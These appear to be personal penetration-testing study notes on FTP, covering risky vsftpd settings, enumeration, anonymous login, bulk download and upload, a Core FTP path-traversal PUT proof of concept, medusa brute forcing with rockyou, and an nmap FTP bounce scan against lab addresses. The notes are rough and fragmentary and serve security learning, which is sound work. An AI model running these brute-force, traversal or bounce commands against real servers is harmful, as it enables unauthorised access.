PORTS: `21`

## FTP packages, and misconfigurations

---

vftp"
`/etc/ftpusers` that we also need to pay attention to, as this file is used to deny certain users access to the FTP service.

```shell-session
$ cat /etc/ftpusers
```

http://vsftpd.beasts.org/vsftpd_conf.html

| **Setting**                    | **Description**                                                                    |
| ------------------------------ | ---------------------------------------------------------------------------------- |
| `anonymous_enable=YES`         | Allowing anonymous login?                                                          |
| `anon_upload_enable=YES`       | Allowing anonymous to upload files?                                                |
| `anon_mkdir_write_enable=YES`  | Allowing anonymous to create new directories?                                      |
| `no_anon_password=YES`         | Do not ask anonymous for password?                                                 |
| `anon_root=/home/username/ftp` | Directory for anonymous.                                                           |
| `write_enable=YES`             | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |
|                                |                                                                                    |
|                                |                                                                                    |

connect to ftp using ssh & get certificate info

## Interacting with FTP

---

This section aims to obtain information about the server running the service and how it's configured.

#### NMAP SCRIPTS

anon-login
#nmap #nmapscripts

```bash
$ find / -type f -name ftp* 2>/dev/null | grep scripts
```

SSL Certificate, FTP version, user information,

```
$ nc -vn 10.129.112.143 21
```

get certificate if any:

```
$ openssl s_client -connect 10.129.22.120:21 -starttls ftp

Server certificate

-----BEGIN CERTIFICATE-----

MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
```

#### Anonymous Login

```shell-session
$ ftp 10.129.14.136
```

You can us the commands `HELP` and `FEAT` to obtain some information of the FTP server.

Get info on Server Configuration

```
ftp> status
```

Some commands should be used occasionally, as these will make the server show us more information that we can use for our purposes. These commands include `debug` and `trace`.

#### Recursive Listing

```shell-session
ftp> ls -R
```

get file

```shell-session
ftp> get Important\ Notes.txt
```

#### Download All Available Files

```shell-session
$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
$ tree .
```

### Download all files using specific port

```
$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136:<PORT-NUMBER>
```

##### UPLOAD FILES

```shell-session
ftp> put testupload.txt
```

It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL.
Use `openssl` command used on top

example vulnerability with core ftp (research whats on nmap)

```shell-session
$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Check for anonymous access

```
ftp IP
ftp anonymous@ip -P port idk
NAME: anonymous
pass: anonymous
```

## Attacking FTP

##### Brute Forcing

If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. There are many different  
`medusa -u/U -p/P -M ftp -h IP`
EXAMPLE

```shell-session
 medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp -n <port>
```

#### FTP Bounce Attack

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ`
Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.
![](/images/ftp_bounce_attack.webp)
Bounce attack

```shell-session
$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
FTP command misalignment detected ... correcting.
```

---

file operations
We can use the commands `ls` and `cd` to move around directories like in Linux. To download a single file, we use `get`, and to download multiple files, we can use `mget`. For upload operations, we can use `put` for a simple file or `mput` for multiple files. We can use `help` in the FTP client session for more information.
